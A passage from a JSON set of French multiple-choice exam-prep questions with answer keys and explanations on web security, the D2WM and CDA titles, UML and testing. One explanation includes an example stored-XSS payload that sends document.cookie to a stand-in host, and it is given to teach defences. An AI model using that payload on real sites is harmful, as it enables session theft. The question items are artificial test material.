            "explanation": "Le Cross-Site Scripting exploite l'affichage de données saisies par l'utilisateur sans échappement.\nExemple : un utilisateur enregistre comme pseudo <script>document.location='https://piege.fr?c='+document.cookie</script> ; tout visiteur qui voit ce pseudo exécute le script, qui peut voler le cookie de session.\nProtections :\n- échapper les sorties : htmlentities()/htmlspecialchars() en PHP, échappement automatique des templates (React, Twig, Blade) ;\n- ne jamais injecter de saisie utilisateur avec innerHTML ;\n- en-tête Content-Security-Policy (CSP) pour limiter les sources de scripts ;\n- cookies HttpOnly (inaccessibles au JavaScript) et SameSite contre le vol de session.\nÀ l'oral, donner l'exemple d'un contenu stocké en base puis affiché non échappé (XSS stocké) est très parlant."
        },
        {
            "theme": "La sécurité",
            "question": "Comment sécurisez-vous les formulaires d'une application web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En retirant tous les champs du formulaire après la première soumission",
                "En validant uniquement en JavaScript côté client, le serveur restant volontairement simple",
                "En validant et assainissant les données côté serveur, en échappant les sorties, en utilisant des requêtes préparées et des tokens CSRF, en limitant les tentatives et en hashant les mots de passe",
                "En protégeant le formulaire uniquement par un mot de passe d'administration global"
            ],
            "correct": 2,
            "explanation": "La sécurisation d'un formulaire se fait en profondeur, principalement côté serveur :\n- validation serveur systématique : type, longueur, format (e-mail), champs obligatoires -> message d'erreur clair si invalide ;\n- assainissement des entrées puis requêtes préparées contre l'injection SQL ;\n- échappement des sorties contre le XSS ;\n- token CSRF (jeton de session dans le formulaire, vérifié à la soumission) contre les soumissions forgées depuis un autre site ;\n- limitation des tentatives (rate limiting) et anti-spam (honeypot, captcha) ;\n- hash des mots de passe (jamais en clair).\nLa validation JavaScript côté client reste utile pour l'expérience utilisateur (retour immédiat), mais elle est contournable et ne remplace jamais le serveur."
        },
        {
            "theme": "La sécurité",
            "question": "Faut-il vérifier les données côté client ou côté serveur ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Côté client uniquement, car c'est plus rapide et plus agréable pour l'utilisateur",
                "Côté serveur uniquement, la validation côté client étant totalement inutile",
                "Aucune vérification n'est nécessaire si le formulaire est bien conçu",
                "Les deux, mais principalement côté serveur : la validation côté client améliore l'expérience, mais elle est contournable ; seule la validation serveur garantit l'intégrité et la sécurité des données"
            ],
            "correct": 3,
            "explanation": "La réponse attendue est : les deux, mais la validation qui compte est côté serveur.\n- côté client (JavaScript, attributs HTML) : retour immédiat, moins d'allers-retours serveur, meilleur confort - mais contournable en quelques secondes (DevTools, requête forgée avec curl ou Postman) ;\n- côté serveur : seule source de vérité. Tout ce qui entre en base doit y être validé (type, longueur, format, unicité, règles métier).\nOn y ajoute des contraintes côté base de données (types, longueurs maximales, contraintes) comme dernière ligne de défense.\nUn piège d'oral classique : dire 'j'ai validé en JavaScript donc c'est sécurisé'. Le jury attend la hiérarchie : client = expérience utilisateur, serveur = sécurité."
        },
        {
            "theme": "La sécurité",
            "question": "Comment fonctionne l'authentification dans un projet web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'utilisateur envoie son mot de passe dans l'URL à chaque page pour prouver son identité",
                "L'utilisateur se connecte, le serveur vérifie le mot de passe hashé, puis crée une session (cookie) ou délivre un token (JWT) envoyé à chaque requête pour identifier l'utilisateur ; les routes protégées vérifient ce jeton via un middleware",
                "L'authentification consiste à mémoriser le nom d'utilisateur dans le localStorage, sans mot de passe",
                "Tous les utilisateurs partagent un compte unique pour simplifier la sécurité"
            ],
            "correct": 1,
            "explanation": "Déroulé classique d'une authentification :\n1. l'utilisateur soumet ses identifiants sur le formulaire de connexion ;\n2. le serveur récupère l'utilisateur et compare la saisie avec le hash stocké (password_verify) ;\n3. si c'est correct, le serveur crée une session côté serveur (identifiant stocké dans un cookie, ex : PHPSESSID, de préférence HttpOnly) ou signe un token JWT que le front stocke et renvoie à chaque requête ;\n4. un middleware vérifie la session/le token sur chaque route protégée et lit les droits de l'utilisateur (rôles) ;\n5. à la déconnexion, la session est détruite ou le token invalidé.\nÀ l'oral, dérouler ce mécanisme avec les fichiers/routeurs de son propre projet (contrôleur de connexion, middleware, gestion des rôles) est exactement ce que le jury attend."
        },
        {
            "theme": "La sécurité",
            "question": "Quelle est la différence entre authentification et autorisation ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Ce sont deux orthographes du même concept",
                "L'authentification gère les sauvegardes et l'autorisation les restaurations",
                "L'authentification vérifie qui vous êtes (identité) ; l'autorisation définit ce que vous avez le droit de faire (permissions)",
                "L'autorisation se fait côté client et l'authentification côté base de données"
            ],
            "correct": 2,
            "explanation": "Deux questions différentes :\n- authentification : 'qui êtes-vous ?' -> vérification de l'identité via login/mot de passe, session ou token ;\n- autorisation : 'qu'avez-vous le droit de faire ?' -> permissions et rôles (un simple utilisateur ne peut pas supprimer les articles, un admin oui).\nDans une application, l'authentification ouvre la session ; l'autorisation s'appuie sur les rôles (RBAC) pour filtrer les actions.\nLes codes HTTP traduisent bien la distinction : 401 Unauthorized = non authentifié (identité inconnue ou invalide) ; 403 Forbidden = authentifié mais non autorisé.\nExemple d'oral : Alice connectée (authentifiée) tente d'éditer le profil de Bob -> refus 403 car non autorisée."
        },
        {
            "theme": "La sécurité",
            "question": "Comment fonctionne JWT (JSON Web Token) ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Un JWT est un token signé composé de trois parties (en-tête, payload, signature) ; le serveur le délivre à la connexion, le client le renvoie à chaque requête, et le serveur vérifie la signature sans stocker le token",
                "Un JWT est un mot de passe stocké en clair dans un cookie public",
                "Un JWT chiffre toute la base de données de l'application",
                "Un JWT est un identifiant de session stocké uniquement côté serveur et jamais transmis"
            ],
            "correct": 0,
            "explanation": "Structure d'un JWT : header.payload.signature (encodés en Base64).\n- header : algorithme de signature (ex : HS256) ;\n- payload : les claims (sub = utilisateur, exp = expiration, role...) ;\n- signature : calculée par le serveur avec sa clé secrète (HMAC) ou une clé privée (RSA).\nDéroulé : login -> le serveur signe et renvoie le token -> le front le stocke et l'envoie dans Authorization: Bearer <token> -> le serveur recalcule la signature : si elle correspond, le token est authentique et non modifié.\nAvantages : stateless (pas de session stockée côté serveur, adapté aux API et au mobile).\nPrécautions : le payload n'est PAS chiffré (lisible par tous : jamais de données sensibles) ; expiration courte ; HTTPS obligatoire ; un token volé reste valide jusqu'à expiration (pas de révocation simple). Signature = intégrité, pas confidentialité."
        },
        {
            "theme": "La sécurité",
            "question": "Qu'est-ce qu'une faille CSRF (Cross-Site Request Forgery) et comment s'en protéger ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Une attaque qui forge des requêtes vers un site où l'utilisateur est authentifié, en exploitant le cookie de session envoyé automatiquement par le navigateur ; on s'en protège par des tokens CSRF, des cookies SameSite et l'usage de tokens non automatiques (en-tête Authorization)",
                "Un virus qui chiffre les fichiers du serveur",
                "Une technique pour accélérer l'affichage des formulaires",
                "Un type de requête SQL interdite"
            ],
            "correct": 0,
            "explanation": "Scénario d'attaque : l'utilisateur est connecté à votre site (son cookie de session est actif) ; il visite un site malveillant qui déclenche, à son insu, une requête vers votre site (ex : POST /virement) - le navigateur attache automatiquement le cookie, la requête semble légitime.\nProtections :\n- token CSRF : jeton aléatoire lié à la session, inclus dans chaque formulaire et vérifié côté serveur ;\n- cookies SameSite=Lax/Strict : les cookies ne sont pas envoyés sur les requêtes inter-sites ;\n- exiger la re-saisie du mot de passe pour les actions sensibles ;\n- ou utiliser des tokens dans l'en-tête Authorization (jamais envoyés automatiquement par le navigateur, donc insensibles au CSRF).\nLes frameworks modernes (Symfony, Laravel, Django) intègrent une protection CSRF activable."
        },
        {
            "theme": "La sécurité",
            "question": "Comment protégez-vous les accès aux données sensibles de votre application ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En affichant toutes les données à tous les utilisateurs pour simplifier l'interface",
                "En stockant les données sensibles dans le code source du front",
                "En comptant sur le fait que personne ne connaît les URL des pages",
                "Par une authentification obligatoire, un contrôle des autorisations côté serveur (rôles/permissions), le principe du moindre privilège, HTTPS partout, le hash des mots de passe et la minimisation des données stockées"
            ],
            "correct": 3,
            "explanation": "Défense en profondeur (defense in depth) :\n1. authentification : qui êtes-vous ? ;\n2. autorisation côté serveur, sur chaque route ET chaque ressource : un utilisateur ne doit pouvoir lire/modifier que ses propres ressources (403 sinon) ;\n3. principe du moindre privilège : comptes techniques SQL restreints, rôles applicatifs minimaux ;\n4. transport chiffré : HTTPS ;\n5. mots de passe hashés, secrets hors du code (variables d'environnement) ;\n6. RGPD : minimisation (ne stocker que le nécessaire), durée de conservation, journalisation des accès aux données sensibles.\nRègle d'or à citer : masquer un bouton dans l'interface ne protège rien, tout se vérifie côté serveur."
        },
        {
            "theme": "La sécurité",
            "question": "Pourquoi utiliser HTTPS plutôt que HTTP ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "HTTPS chiffre les échanges entre le client et le serveur (TLS) : les données sensibles ne circulent pas en clair, l'identité du serveur est certifiée et l'intégrité des données est garantie",
                "HTTPS accélère le site car il compresse automatiquement les pages",
                "HTTPS rend le site invisible pour les attaquants",
                "HTTPS n'est utile que pour les sites de banque"
            ],
            "correct": 0,
            "explanation": "En HTTP, tout circule en clair : sur un réseau partagé (wifi public), un intercepteur peut lire les mots de passe, détourner la session ou modifier le contenu en route.\nHTTPS = HTTP + TLS, qui apporte :\n- confidentialité : chiffrement des échanges ;\n- authentification du serveur : certificat qui prouve qu'on parle bien au bon serveur (protection contre l'homme du milieu) ;\n- intégrité : les données ne peuvent pas être modifiées en transit sans détection.\nÀ citer : certificats gratuits via Let's Encrypt ; obligation au sens du RGPD pour toute donnée personnelle ; navigateurs qui marquent les sites HTTP 'non sécurisés' ; HTTPS favorable au SEO et à HTTP/2."
        },
        {
            "theme": "La sécurité",
            "question": "Donnez un exemple concret de faille de sécurité dans un projet et la manière dont vous l'avez traitée.",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Je n'ai jamais rencontré la moindre faille : mon code est invulnérable",
                "Les failles ne concernent que les gros sites, pas les projets de formation",
                "Un exemple concret (requête SQL concaténée, mot de passe en clair, XSS via un champ non échappé...) : expliquer le risque, comment on l'a détectée, la correction mise en place (requête préparée, hash, échappement) et la prévention générale ensuite",
                "J'ignore les failles découvertes pour ne pas ralentir le projet"
            ],
            "correct": 2,
            "explanation": "Structure de réponse attendue (la méthode compte plus que l'exemple) :\n1. la faille : ex 'je concaténais l'e-mail dans ma requête de connexion' (injection SQL), 'les messages étaient affichés sans échappement' (XSS stocké), 'les mots de passe étaient comparés en clair' ;\n2. le risque concret : contournement d'authentification, vol de session ;\n3. la détection : audit, veille OWASP, test manuel ;\n4. la correction : requête préparée, password_hash/password_verify, htmlentities, token CSRF, HTTPS ;\n5. la prévention ensuite : validation serveur, dépendances à jour, suivi de l'OWASP Top 10, tests.\nLe jury évalue l'honnêteté technique et la capacité d'analyse, pas la perfection."
        }
    ],
    "Filière D2WM & CDA": [
        {
            "theme": "Filière D2WM & CDA",
            "question": "Que signifie D2WM et que couvre ce titre ?",
            "level": "Facile",
            "filiere": "D2WM",
            "answers": [
                "Développeur Web et Web Mobile : un titre professionnel de niveau 5 (équivalent Bac+2) orienté vers le développement web front-end et back-end d'applications web et web mobile",
                "Développeur Web 2.0 Modern : une certification de niveau 7 en gestion de projet web",
                "Data Warehouse Management : un titre orienté bases de données massives",
                "Directeur Web et Marketing digital : un titre de niveau Bac+5"
            ],
            "correct": 0,
            "explanation": "D2WM signifie Développeur Web et Web Mobile.\nC'est un titre professionnel inscrit au RNCP (Répertoire National des Certifications Professionnelles), de niveau 5, équivalent Bac+2, délivré par le Ministère du Travail (ex. via l'ENI).\nLe titre couvre :\n- le maquettage et l'intégration de pages web (HTML5, CSS3, responsive) ;\n- le développement front-end (JavaScript) ;\n- le développement back-end (PHP ou équivalent) et les bases de données ;\n- l'optimisation (accessibilité, référencement, sécurité de base) ;\n- la mise en ligne, Git/GitHub et la veille technologique.\nL'évaluation repose sur des blocs de compétences, souvent validés par un projet et une soutenance devant un jury."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Que signifie CDA et que couvre ce titre ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "Concepteur Développeur d'Applications : un titre professionnel de niveau 6 (équivalent Bac+3) centré sur la conception et le développement d'applications, de la modélisation jusqu'au déploiement, en passant par la gestion de projet et la sécurité",
                "Certifié Développeur Android : un titre spécialisé mobile de niveau 4",
                "Concepteur de Design Applications : un titre orienté maquettage UI",
                "Chef de Développement Administratif : un titre de management non technique"
            ],
            "correct": 0,
            "explanation": "CDA signifie Concepteur Développeur d'Applications.\nC'est un titre professionnel inscrit au RNCP, de niveau 6 (équivalent Bac+3), délivré par le Ministère du Travail (ex. via l'ENI).\nLe titre couvre :\n- la conception : modélisation (UML, MCD), choix architecturaux, design patterns ;\n- le développement : POO, tests unitaires, applications multi-supports (web, mobile, desktop) ;\n- la sécurisation des applications et des données ;\n- le déploiement (CI/CD, conteneurisation) ;\n- la gestion de projet (méthodes agiles) et la collaboration, avec une veille technologique en anglais.\nLa différence avec le D2WM : le CDA ajoute une vraie dimension de conception et d'architecture, avec une autonomie plus grande sur les choix techniques."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Quelle est la différence entre les titres D2WM et CDA ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Ils sont identiques, seule l'école qui les délivre change",
                "Le D2WM de niveau 5 (Bac+2) couvre la réalisation de solutions web et web mobile ; le CDA de niveau 6 (Bac+3) couvre en plus la conception d'applications, l'architecture, la gestion de projet et le pilotage, avec une autonomie plus grande",
                "Le D2WM est un titre back-end et le CDA un titre front-end",
                "Le CDA est la version obsolète du D2WM, remplacée depuis 2010"
            ],
            "correct": 1,
            "explanation": "Les deux titres sont complémentaires mais se distinguent sur trois axes :\n- niveau : D2WM = RNCP niveau 5 (équivalent Bac+2) ; CDA = RNCP niveau 6 (équivalent Bac+3) ;\n- périmètre : le D2WM vise la réalisation (intégration, développement front/back web et web mobile) ; le CDA ajoute la conception (modélisation, architecture), la gestion de projet, la sécurisation et le déploiement d'applications multi-supports ;\n- autonomie : le développeur D2WM applique une commande ; le concepteur développeur CDA participe aux choix de conception et argumente les solutions techniques.\nLe jury CDA attend donc davantage de recul architectural et de justification des choix, tandis que le jury D2WM insiste sur la qualité de réalisation et les fondamentaux web."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Quel est le niveau RNCP du titre Développeur Web et Web Mobile (D2WM) ?",
            "level": "Facile",
            "filiere": "D2WM",
            "answers": [
                "Niveau 5, équivalent Bac+2",
                "Niveau 7, équivalent Bac+5",
                "Niveau 3, équivalent CAP",
                "Niveau 4, équivalent Baccalauréat"
            ],
            "correct": 0,
            "explanation": "Le titre professionnel Développeur Web et Web Mobile est inscrit au RNCP au niveau 5, équivalent Bac+2 (comme un BTS ou un BUT à deux ans).\nLe RNCP (Répertoire National des Certifications Professionnelles) classe les certifications du niveau 3 (CAP) au niveau 8 (doctorat).\nL'évaluation se fait par blocs de compétences, souvent validés par un projet professionnel présenté lors d'une soutenance devant un jury - d'où l'importance de bien préparer l'oral et la démonstration de son projet."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Quel est le niveau RNCP du titre Concepteur Développeur d'Applications (CDA) ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "Niveau 6, équivalent Bac+3",
                "Niveau 8, équivalent doctorat",
                "Niveau 5, équivalent Bac+2",
                "Niveau 4, équivalent Baccalauréat"
            ],
            "correct": 0,
            "explanation": "Le titre professionnel Concepteur Développeur d'Applications est inscrit au RNCP au niveau 6, équivalent Bac+3 (comme une licence professionnelle).\nC'est un cran au-dessus du titre Développeur Web et Web Mobile (niveau 5).\nL'évaluation en soutenance porte sur les blocs de compétences du référentiel : conception, développement, sécurisation, déploiement et collaboration - le jury attend des justifications techniques et une vision d'ensemble du projet, pas seulement une démonstration fonctionnelle."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Quelles sont les principales compétences visées par le titre Développeur Web et Web Mobile (D2WM) ?",
            "level": "Intermédiaire",
            "filiere": "D2WM",
            "answers": [
                "Uniquement la création de maquettes graphiques et d'identités visuelles",
                "La gestion administrative et comptable de projets numériques",
                "L'administration réseau et le câblage des serveurs",
                "La création d'applications web et web mobile sécurisées : maquettage et intégration HTML/CSS, développement front-end (JavaScript), développement back-end, bases de données, tests, optimisation (accessibilité, référencement) et mise en ligne"
            ],
            "correct": 3,
            "explanation": "Le référentiel D2WM vise la réalisation complète d'applications web et web mobile :\n- conception : bonnes pratiques UX et maquettage d'interfaces ;\n- intégration : HTML5, CSS3, responsive design, accessibilité et référencement ;\n- développement front-end : JavaScript, DOM, consommation d'API ;\n- développement back-end : langage serveur (ex : PHP), logique métier, bases de données relationnelles ;\n- qualité : tests, sécurisation de base, Git/GitHub pour la collaboration ;\n- professionnalisation : anglais technique, veille, communication.\nÀ l'oral, chaque bloc validé doit pouvoir s'appuyer sur des réalisations concrètes de son projet : relier systématiquement 'compétence -> ce que j'ai fait -> comment je l'explique'."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Quelles sont les principales compétences visées par le titre Concepteur Développeur d'Applications (CDA) ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "La conception d'applications (modélisation, architecture), le développement (POO, tests), la sécurisation, le déploiement (CI/CD, conteneurisation), la gestion de projet agile et la collaboration, avec une veille technologique en anglais",
                "La maîtrise exclusive d'un seul langage de programmation imposé",
                "La rédaction de cahiers des charges juridiques et commerciaux",
                "La maintenance matérielle des postes de travail de l'entreprise"
            ],
            "correct": 0,
            "explanation": "Le référentiel CDA couvre le cycle de vie complet d'une application :\n- conception : traduction du besoin, modélisation (UML, MCD), choix architecturaux et design patterns ;\n- développement : POO, qualité de code, tests unitaires, applications multi-supports (web, mobile, desktop) ;\n- sécurisation : protection des données, gestion des accès, état de l'art de la sécurité à chaque étape ;\n- déploiement : intégration et livraison continues (CI/CD), conteneurisation (Docker) ;\n- gestion de projet : méthodes agiles, planification, collaboration et communication ;\n- transversal : anglais technique (documentation, échanges), veille technologique.\nEn soutenance, le jury CDA attend des choix de conception argumentés : c'est la différence majeure avec le titre D2WM."
        },
        {
            "theme": "Filière D2WM & CDA",
            "question": "Comment se déroule une soutenance de titre professionnel (D2WM ou CDA) et comment s'y préparer ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un oral blanc sans support, où le jury pose des questions aléatoires sans lien avec le projet",
                "Un examen écrit de quatre heures sur la théorie des langages de programmation",
                "Une simple démonstration vidéo envoyée par e-mail, sans échange avec le jury",
                "Une présentation orale du projet (contexte, besoins, conception, technologies, réalisations, difficultés) suivie de questions du jury sur les compétences du référentiel et d'une démonstration de l'application"
            ],
            "correct": 3,
            "explanation": "Une soutenance de titre professionnel se prépare comme une mise en situation professionnelle :\n1. présentation structurée : contexte et besoin, conception (maquettes, modèle de données), choix des technologies argumentés, réalisations clés, difficultés et solutions, bilan ;\n2. démonstration fonctionnelle de l'application, testée et répétée en conditions réelles ;\n3. questions du jury : chacune vise un bloc de compétences du référentiel (HTML/CSS, JavaScript, back-end, base de données, sécurité, RGPD, gestion de projet...) ;\n4. posture : assumer ses choix, reconnaître les limites du projet, répondre précisément et de façon structurée.\nPréparation concrète : supports de présentation sobres, timing répété, questions pièges anticipées (pourquoi cette techno, comment sont stockés les mots de passe, comment se protège-t-on des injections), et une application stable pour la démo."
        }
    ],
    "UML & Conception": [
        {
            "theme": "UML & Conception",
            "question": "Quels diagrammes UML avez-vous utilisés dans votre projet ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Aucun, UML est interdit dans les projets professionnels",
                "Uniquement des diagrammes de déploiement réseau",
                "Un seul diagramme : la capture d'écran de la base de données",
                "Les diagrammes de cas d'utilisation, de classes et de séquence (et éventuellement d'activités), choisis selon ce qu'on voulait communiquer"
            ],
            "correct": 3,
            "explanation": "Diagrammes utiles en projet :\n- cas d'utilisation : qui fait quoi (acteurs et fonctions) ;\n- classes : structure statique (classes, attributs, méthodes, relations) ;\n- séquence : dynamique d'un scénario (ordre des échanges entre objets) ;\n- activités : enchaînement d'un workflow ;\n- états : cycle de vie d'un objet (ex : commande : panier -> payée -> expédiée) ;\n- déploiement : infrastructure.\nConseil d'oral : citer 2 ou 3 diagrammes réellement utilisés et surtout expliquer ce qu'ils ont permis de clarifier avant de coder - le jury évalue l'usage, pas la liste."
        },
        {
            "theme": "UML & Conception",
            "question": "Quelle est la différence entre un diagramme de classes et un MCD ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Le diagramme de classes décrit les classes du logiciel (attributs, méthodes, héritage, relations) ; le MCD décrit les entités du domaine métier et leurs relations, indépendamment de la technique",
                "Ce sont deux noms exactement identiques pour le même schéma",
                "Le MCD sert uniquement à la sécurité et le diagramme de classes aux tests",
                "Le diagramme de classes décrit la base de données et le MCD l'interface graphique"
            ],
            "correct": 0,
            "explanation": "MCD (Merise) : entités, associations, cardinalités - vue métier des données, préalable au MLD puis au MPD (tables, clés).\nDiagramme de classes (UML) : classes avec attributs ET méthodes (le comportement), héritage, interfaces, associations - vue logicielle orientée objet.\nLien entre les deux : les entités du MCD inspirent souvent les classes métier et les tables, mais le diagramme de classes va plus loin en modélisant le comportement et la structure du code.\nEn oral : le MCD alimente la base de données, le diagramme de classes alimente le code - et les deux partent du même besoin métier."
        },
        {
            "theme": "UML & Conception",
            "question": "À quoi sert un diagramme de séquence ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "À trier les données de la base par ordre chronologique",
                "À représenter l'ordre temporel des échanges entre acteurs et objets pour un scénario précis : qui appelle quoi, dans quel ordre, avec quels retours",
                "À planifier les dates de livraison du projet",
                "À décrire l'apparence graphique de chaque écran"
            ],
            "correct": 1,
            "explanation": "Le diagramme de séquence montre, pour un cas d'utilisation précis (ex : 'passer une commande'), la chronologie des messages entre les participants : acteur, contrôleur, service, base de données.\nÉléments : lignes de vie (participants), messages (flèches synchrones/asynchrones), retours, fragments (boucles, conditions).\nUtilité : clarifier les responsabilités avant de coder, vérifier un scénario complexe pas à pas, communiquer avec l'équipe et le jury.\nExemple type en soutenance : utilisateur -> contrôleur -> service commande -> modèle -> base de données, puis retour de la réponse."
        },
        {
            "theme": "UML & Conception",
            "question": "Pourquoi modéliser avant de développer ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "Pour occuper le temps entre le cahier des charges et le code",
                "Parce que le modèle remplace le code : une fois dessiné, l'application est finie",
                "Uniquement parce que le client exige toujours des schémas",
                "Pour valider la compréhension du besoin avant d'écrire du code, détecter les incohérences tôt (quand corriger coûte peu), cadrer le périmètre et partager un vocabulaire commun"
            ],
            "correct": 3,
            "explanation": "L'argument massue est économique : une erreur corrigée sur le schéma coûte des minutes, en code des heures, en production des jours avec impact utilisateur.\nLa modélisation (cas d'utilisation, diagramme de classes, MCD) permet :\n- de valider le besoin avec le client avant d'investir du code ;\n- d'anticiper les relations, les règles métier et les cas limites ;\n- d'estimer et de découper le travail ;\n- de partager un vocabulaire commun (entités, acteurs, scénarios).\nC'est une compétence coeur du titre CDA : concevoir avant de réaliser, et pas coder d'abord puis découvrir les incohérences."
        },
        {
            "theme": "UML & Conception",
            "question": "Comment avez-vous identifié vos objets métier ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En créant une classe pour chaque table de la base de données, sans analyse du besoin",
                "En copiant les objets d'un projet existant trouvé sur internet",
                "En reprenant les fichiers créés automatiquement par l'IDE",
                "À partir des cas d'utilisation et du discours métier : les acteurs, les concepts qu'ils manipulent et les verbes importants (client, commande, réservation...) donnent les classes candidates, que l'on affine en attributs et responsabilités"
            ],
            "correct": 3,
            "explanation": "Méthode d'analyse :\n1. partir des cas d'utilisation et des entretiens avec le demandeur ;\n2. repérer les noms importants du discours métier -> classes candidates (Client, Livre, Emprunt) ;\n3. repérer les verbes -> méthodes et associations ('emprunter', 'réserver') ;\n4. raffiner : attributs, responsabilités, cardinalités (1-N, N-N), règles métier.\nExemple : 'un adhérent emprunte au plus trois livres' donne Adhérent, Livre, Emprunt (avec dates) et la règle 'maximum 3'.\nNuance : classe métier et table de base se recoupent souvent, mais l'objet métier se définit par le besoin, pas par la table."
        },
        {
            "theme": "UML & Conception",
            "question": "Comment avez-vous défini vos règles métier ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En les improvisant pendant le développement, selon l'inspiration du moment",
                "En les demandant uniquement à l'utilisateur final après la mise en production",
                "En récupérant les règles d'un concurrent sans les adapter",
                "En les extrayant du cahier des charges et des échanges avec le demandeur, en les formalisant clairement, puis en les centralisant dans la couche métier et en les verrouillant par des tests"
            ],
            "correct": 3,
            "explanation": "Une règle métier est une contrainte du domaine : 'emprunt limité à 3 livres', 'remise de 10% dès 100 euros', 'une réservation expire après 48h'.\nDémarche attendue :\n1. recensement : cahier des charges, interviews, exemples concrets du demandeur ;\n2. formalisation : tableau de règles (identifiant, description, conditions) validé avec le client ;\n3. implémentation centralisée dans la couche métier (services, validateurs) - jamais dispersée dans les vues ;\n4. tests unitaires : une règle = au moins un cas nominal et un cas d'erreur.\nLa traçabilité besoin -> règle -> code -> test est exactement ce que le jury CDA veut entendre."
        },
        {
            "theme": "UML & Conception",
            "question": "Comment présenter le diagramme de classes principal de votre application ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En listant chaque attribut et méthode de toutes les classes, sans ordre",
                "En montrant uniquement les classes techniques (contrôleurs, routes)",
                "En recopiant le schéma de la base de données en changeant le titre",
                "En partant des classes métier centrales (nom, attributs clés, méthodes importantes), puis en montrant leurs relations avec les cardinalités, l'héritage éventuel, et en expliquant les choix au fil du schéma"
            ],
            "correct": 3,
            "explanation": "Présentation attendue :\n1. commencer par 2 à 4 classes métier du coeur (ex : Utilisateur, Commande, Produit) ;\n2. décrire leurs attributs clés et méthodes importantes, sans exhaustivité ;\n3. dérouler les relations avec leurs cardinalités ('une commande contient 1..N lignes') ;\n4. montrer l'héritage ou les interfaces si présents, et justifier ;\n5. relier chaque élément au besoin métier.\nConseils : s'entraîner à le redessiner à main levée au tableau ; le jury veut vérifier la maîtrise de la structure, pas la mémoire exhaustive du schéma."
        },
        {
            "theme": "UML & Conception",
            "question": "Expliquez la relation entre deux classes dans un diagramme de classes.",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Une association avec cardinalités (1, 0..1, 1..*, *), un héritage (généralisation 'est un'), une agrégation (losange vide : le contenu survit au conteneur) ou une composition (losange plein : le contenu meurt avec le conteneur)",
                "Il n'existe qu'un seul type de relation : la flèche simple",
                "Deux classes ne peuvent jamais être reliées dans un diagramme UML",
                "Les relations ne servent qu'à choisir les couleurs des classes"
            ],
            "correct": 0,
            "explanation": "Types de relations à maîtriser :\n- association avec cardinalités : 'un client passe 0..N commandes' ;\n- héritage/généralisation : Voiture 'est un' Vehicule (flèche à triangle vide) ;\n- dépendance : usage temporaire d'une classe par une autre (flèche pointillée) ;\n- agrégation : Equipe --o Joueur : les joueurs existent sans l'équipe ;\n- composition : Commande --| LigneCommande : les lignes n'ont pas de sens sans la commande.\nTraduction en code : propriété + collection pour l'association, extends/implements pour l'héritage ; traduction en base : clé étrangère, table d'association pour les N-N."
        }
    ],
    "Les tests": [
        {
            "theme": "Les tests",
            "question": "Quelle est la différence entre un test unitaire et un test d'intégration ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Le test unitaire vérifie une unité isolée (une méthode, une classe) avec ses dépendances remplacées par des doubles (mocks) ; le test d'intégration vérifie la collaboration entre composants réels (API et base, couches logicielles)",
                "Le test unitaire teste l'interface graphique, le test d'intégration la base de données",
                "Ce sont deux noms du même test, l'un payant et l'autre gratuit",
                "Le test d'intégration remplace toujours les tests unitaires dans les méthodes agiles"
            ],
            "correct": 0,
            "explanation": "Test unitaire : périmètre minuscule (ex : une fonction de calcul de remise), rapide, isolé - les dépendances sont mockées pour ne pas toucher à la base. Outils : PHPUnit, Jest, JUnit, pytest.\nTest d'intégration : plusieurs briques réelles ensemble - 'l'appel POST /api/commandes écrit-il bien la commande en base et renvoie-t-il 201 ?' (base de test dédiée, souvent montée en Docker).\nPyramide des tests : beaucoup d'unitaires (rapides, précis, localisent les bugs), moins de tests d'intégration (détectent les problèmes de câblage), peu de tests de bout en bout (lents, proches de l'utilisateur réel).\nChaque niveau a sa place : l'unitaire pour la logique, l'intégration pour les assemblages."
        },
        {
            "theme": "Les tests",
            "question": "Quels outils utilisez-vous pour tester votre application ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Uniquement la vérification manuelle de la page d'accueil",
                "Aucun outil : les utilisateurs finaux testent en production",
                "Le compilateur, qui prouve que l'application fonctionne",
                "Un framework de tests unitaires adapté au langage (PHPUnit, Jest, JUnit, pytest), un outil d'appels d'API (Postman), et éventuellement des tests navigateur automatisés (Cypress, Playwright) et un analyseur de couverture"
            ],
            "correct": 3,
